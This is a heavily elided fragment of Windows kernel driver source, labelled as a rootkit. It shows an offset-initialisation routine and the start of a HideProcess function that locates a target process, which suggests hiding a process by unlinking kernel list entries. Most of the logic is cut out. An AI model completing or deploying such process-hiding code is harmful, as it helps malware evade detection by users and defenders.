...
BOOLEAN InitializeOffsets()
{
	...
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}
...
VOID HideProcess()
{
	...
	do
	{
		...
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] Found target process %s.\n", target);
